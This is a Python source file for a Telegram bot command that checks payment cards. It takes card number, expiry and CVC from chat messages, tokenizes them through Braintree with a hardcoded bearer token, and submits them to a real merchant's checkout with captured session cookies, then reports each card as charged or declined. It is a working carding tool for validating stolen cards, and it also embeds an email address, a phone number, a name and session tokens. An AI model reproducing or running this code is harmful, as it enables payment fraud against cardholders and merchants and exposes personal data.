import csv
import time
import requests

BIN_CSV_FILE = "bins_all.csv"

def get_bin_details(bin_number):
    """
    Fetch BIN details from the local CSV file instead of an API.
    """
    try:
        with open(BIN_CSV_FILE, "r", encoding="utf-8") as file:
            reader = csv.DictReader(file)
            for row in reader:
                if row["number"] == bin_number:
                    return {
                        "country": row["country"],
                        "flag": row["flag"],
                        "vendor": row["vendor"],
                        "type": row["type"],
                        "level": row["level"],
                        "bank": row["bank"]
                    }
        return None  # BIN not found
    except Exception as e:
        print(f"Error reading BIN data: {e}")
        return None

def handle_au(bot, message):
    try:
        wait_message = bot.reply_to(message, "<b>Wait Checking...</b>", parse_mode="HTML")

        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "❌ *Usage:* `/au cardnumber|mm|yy|cvc`", parse_mode="Markdown")
            return

        card_details = command_parts[1].split("|")
        if len(card_details) != 4:
            bot.reply_to(message, "❌ *Invalid format!* Use `/au cardnumber|mm|yy|cvc`", parse_mode="Markdown")
            return

        card_number, card_month, card_year, card_cvc = card_details
        ccs = f"{card_number}|{card_month}|{card_year}|{card_cvc}"
        bin_number = card_number[:6]

        bin_details = get_bin_details(bin_number)
        if bin_details:
            country_name = bin_details["country"]
            country_flag = bin_details["flag"]
            card_vendor = bin_details["vendor"]
            card_type = bin_details["type"]
            card_level = bin_details["level"]
            bank_name = bin_details["bank"]
        else:
            country_name = "Unknown"
            country_flag = "🌍"
            card_vendor = "Unknown"
            card_type = "Unknown"
            card_level = "Unknown"
            bank_name = "Unknown"

        # Start processing time
        start_time = time.time()

        # Prepare Braintree API headers and payload
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDEwMzEyNTEsImp0aSI6IjJmMTlkYTYyLTdlYzEtNDUyMC1iYmY3LTIxNzM5Y2NhZjExNSIsInN1YiI6InFyOG45NjdmdnB2MmhxM3EiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InFyOG45NjdmdnB2MmhxM3EiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQXZlcnlVU0Vjb21tZXJjZSJ9fQ.mVYUwa8nvCrg-I535GxqWJe1zvVGXfpWVnsSSi5QpjfgAzDp-h5EhJdSpfVchnwC1p8k9sG9LPcAckjY0kX6VQ',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'f8aa5603-030e-40c2-b5cf-30df18570aeb',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': card_month,
                        'expirationYear': card_year,
                        'cvv': card_cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        # Make the request to Braintree API
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        payment_method_id = response.json().get("data", {}).get("tokenizeCreditCard", {}).get("token")

        if not payment_method_id:
            bot.reply_to(message, "❌ *Failed to create payment method!* Check the card details.", parse_mode="Markdown")
            return

        # Prepare data for the donation request
        cookies = {
            'osano_consentmanager_uuid': '2befeb4d-79c8-4291-a9a5-3440c6b25c8b',
            'osano_consentmanager': 'cqWPerG7KHyw8wfCy816izt05BNq-gfPEmsI0LjeQIGVDpm6n14KW16fpjh3nuePLBAsUnmg8Djg-oYtRaMujdgCyGg-S7nAKUFIjhKqXILtvcL1-irieikLvWt4Rg0MEzxbPF2R3cTqTS4bknzmkZl3NBFatC95v0jCAyzsj1KOXSh8TkmwFlWtJwjCkAgs4GpfgMd3EwiALkNgOWBnAGuHE7U3OO3UGtro9iQ1VwhxoFFOQY1V_EZkFIqPnyo2EI2nP9B9BoxipXYrsdaKeNhJiA-J0cyrtJnMyS_pSFnK_K0UPxCi1Mf0z7_i53Riy1BjEYdQtYs=',
            '_gcl_au': '1.1.1519302881.1738219053',
            '__attentive_id': 'eaa28050e6bd4c1eabf57147dce29129',
            '__attentive_cco': '1738219056502',
            '_fbp': 'fb.1.1738219057084.815559236163733353',
            'v2_avery': '{%22bid%22:%22696f55d1-f38c-42ea-8c5c-ace689ed112a%22}',
            'BVBRANDID': 'b26b209e-5a44-4eaa-a1f2-eefb12b5e998',
            '_dycnst': 'dg',
            '_dyid': '-7732680317938753999',
            '_pin_unauth': 'dWlkPU9ESTVOR0kyTVRrdE4yUXpPUzAwWlROaUxUa3pObUV0WmpnMk5UVm1ZakJrWVRZeA',
            '_dyid_server': '-7732680317938753999',
            '_pin_unauth': 'dWlkPU9ESTVOR0kyTVRrdE4yUXpPUzAwWlROaUxUa3pObUV0WmpnMk5UVm1ZakJrWVRZeA',
            'attntv_mstore_email': 'drlajoola@gmail.com:0',
            'consumerId': '8ae88005946293ed0194b5f22ee61c75',
            'btid': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb25zdW1lcklkIjoiOGFlODgwMDU5NDYyOTNlZDAxOTRiNWYyMmVlNjFjNzUiLCJpYXQiOjE3MzgyMTkzMzZ9.09t_XsYJSxXgUlWcGEFEGZaJ-dTN4wK0g-I3FSmjyAg',
            '_dycst': 'dk.l.c.ss.',
            'attntv_mstore_phone': '7759865200:0',
            '__attentive_domain': 'averyproducts',
            '__attentive_ceid': 'Hbl',
            'avy_ic': '1',
            'avy_it': '10.42',
            '_gid': 'GA1.2.1119305977.1740944432',
            '__attentive_session_id': '4da40881b1354b6f82f6a274798cc317',
            '_dyjsession': 'tqcrd9sgng7srye7y3yb8pjl5cdiy6we',
            'BVBRANDSID': 'c2597e32-4753-402e-80c0-a4b2bfcd6be3',
            '__attentive_ss_referrer': 'https://www.avery.com/blank/',
            '__attentive_dv': '1',
            '_uetsid': '37118010f79e11ef99ecd928e87a534b',
            '_uetvid': 'b0b46640ded411ef9cc6df969b123d37',
            '_dy_geo': 'IN.AS.IN_JK.IN_JK_Sopur',
            '_dy_df_geo': 'India..Sopur',
            'PHPSESSID': 'l1j15nm1evo9fomeeteognulup',
            'wwjH7clZ8E5v5BsgCqQ5zHYf9OlZ8dCB': 'M2M3M2VjYWJmNzcyOWQzYWJlZGY2NDBjYTE0ZDJmZTA6MTc0MjE1NDA1NDAwMDpkMmJmMTRjOTlmOWNhZDM5ZjM1MWUzOTQwZTk3MzMwMw',
            'customerType': 'n',
            'form_key': 'iiaeFOAqsEY9gqWM',
            'mage-cache-storage': '{}',
            'mage-cache-storage-section-invalidation': '{}',
            'mage-cache-sessid': 'true',
            'section_data_clean': '',
            'dy_fs_page': 'cart.avery.com%2Fcheckout%2Fcart',
            'mage-messages': '',
            'recently_viewed_product': '{}',
            'recently_viewed_product_previous': '{}',
            'recently_compared_product': '{}',
            'recently_compared_product_previous': '{}',
            'product_data_storage': '{}',
            'form_key': 'iiaeFOAqsEY9gqWM',
            'intent_audience': 'high',
            '_dy_toffset': '0',
            '_dy_soct': "1740944853!1229927.-1'1302253.-1'1342500.-393609'1342505.-408'1342506.-394'1342507.-403'1649987.-393566'1649988.-389'1992460.-1735569'1992473.-208797'1992474.0'1992476.-208800'2158187.-393609'2255143.-1'2255146.-1'2255147.-1!4tlqqsjmfg0qr82noxgtiurk3prefyol~615860.-2725795'615861.0'1904149.-398'1904150.-2725794",
            '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzM4MjE5MDU2NDgwLFwidW9cIjoxNzM4MjE5MDU2NDgwLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImVhYTI4MDUwZTZiZDRjMWVhYmY1NzE0N2RjZTI5MTI5XCJ9Iiwic2VzIjoie1widmFsXCI6XCI0ZGE0MDg4MWIxMzU0YjZmODJmNmEyNzQ3OThjYzMxN1wiLFwidW9cIjoxNzQwOTQ0ODU2ODU3LFwiY29cIjoxNzQwOTQ0ODU2ODU3LFwibWFcIjowLjAyMDgzMzMzMzMzMzMzMzMzMn0ifQ==',
            '_ga': 'GA1.1.146378895.1738219056',
            '_rdt_uuid': '1738219055943.ed887861-2986-4489-856f-94c01220496c',
            '__attentive_pv': '8',
            'apt_pixel': 'eyJkZXZpY2VJZCI6ImMwNzY1MWZiLTY4MzUtNDQ2Ny04ZjA5LWEzYTgxYzFhODVmNSIsInVzZXJJZCI6bnVsbCwiZXZlbnRJZCI6MzgsImxhc3RFdmVudFRpbWUiOjE3NDA5NDQ4NjMyMzEsImNoZWNrb3V0Ijp7fX0=',
            'amp_f24a38': '11AvV3HprjC-4DleatGhNJ...1ilc60eni.1ilc6cs4k.0.0.0',
            'amp_f24a38_avery.com': '11AvV3HprjC-4DleatGhNJ...1ilc61hu6.1ilc6cs7a.0.0.0',
            'private_content_version': '873ccc1389c305fb8181f0fa8fa6f0bf',
            'X-Magento-Vary': '5597aff5ffc1879c129a9d181722388193044b5e93850e4b21b4e23c2dc3fc1c',
            '_ga_1YTZ6HDQ0N': 'GS1.1.1740944432.7.1.1740944864.0.0.0',
            'section_data_ids': '{%22customer%22:1740944852%2C%22compare-products%22:1740944852%2C%22last-ordered-items%22:1740944852%2C%22cart%22:1740944852%2C%22directory-data%22:1740944852%2C%22captcha%22:1740944852%2C%22wishlist%22:1740944852%2C%22instant-purchase%22:1740944852%2C%22loggedAsCustomer%22:1740944852%2C%22multiplewishlist%22:1740944852%2C%22persistent%22:1740944852%2C%22review%22:1740944852%2C%22cordial%22:1740944852%2C%22recently_viewed_product%22:1740944852%2C%22recently_compared_product%22:1740944852%2C%22product_data_storage%22:1740944852%2C%22paypal-billing-agreement%22:1740944852%2C%22messages%22:1000}',
        }

        headers = {
            'authority': 'cart.avery.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://cart.avery.com',
            'referer': 'https://cart.avery.com/checkout/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'cartId': '7245385',
            'billingAddress': {
                'customerAddressId': '1628487',
                'countryId': 'US',
                'regionId': '43',
                'regionCode': 'NY',
                'region': 'New York',
                'customerId': '3089747',
                'street': [
                    'STREET 55',
                ],
                'company': 'Top maj',
                'telephone': '+17759865200',
                'fax': None,
                'postcode': '10080-0001',
                'city': 'NEW YORK',
                'firstname': 'Faisal',
                'lastname': 'qadri',
                'middlename': None,
                'prefix': None,
                'suffix': None,
                'vatId': None,
                'customAttributes': [],
                'saveInAddressBook': None,
            },
            'paymentMethod': {
                'method': 'braintree',
                'additional_data': {
                    'payment_method_nonce': payment_method_id,
                    'device_data': '{"correlation_id":"a107b30edcfd0e10f3cd247f6726c94e"}',
                    'is_active_payment_token_enabler': False,
                },
            },
        }

        # Make the donation request
        response = requests.post(
            'https://cart.avery.com/rest/default/V1/carts/mine/payment-information',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        end_time = time.time()
        processing_time = round(end_time - start_time, 2)

        # Wait 0.1 sec before deleting the "Wait Checking..." message
        time.sleep(0.1)
        bot.delete_message(chat_id=message.chat.id, message_id=wait_message.message_id)

        # Handle the response
        if response.status_code != 200:
            bot.reply_to(message, f"""
<b>Declined ❌</b>

𝗖𝗮𝗿𝗱- <code>{ccs}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲- Stripe Charge
𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲- ⤿ Declined ⤾

𝗜𝗻𝗳𝗼- {card_vendor} - {card_type} - {card_level}
𝐁𝐚𝐧𝐤- {bank_name}
𝐂𝐨𝐮𝗻𝘁𝗿𝘆- {country_name} {country_flag}
𝗧𝗶𝗺𝗲- {processing_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
""", parse_mode="HTML")
        else:
            bot.reply_to(message, f"""
<b>Charged 1$ ✅</b>

𝗖𝗮𝗿𝗱- <code>{ccs}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲- Stripe Charge 
𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲- ⤿ Approved ⤾

𝗜𝗻𝗳𝗼- {card_vendor} - {card_type} - {card_level}
𝐁𝐚𝐧𝐤- {bank_name}
𝐂𝐨𝐮𝗻𝘁𝗿𝘆- {country_name} {country_flag}
𝗧𝗶𝗺𝗲- {processing_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
""", parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ *An error occurred:*\n\n```{str(e)}```", parse_mode="Markdown")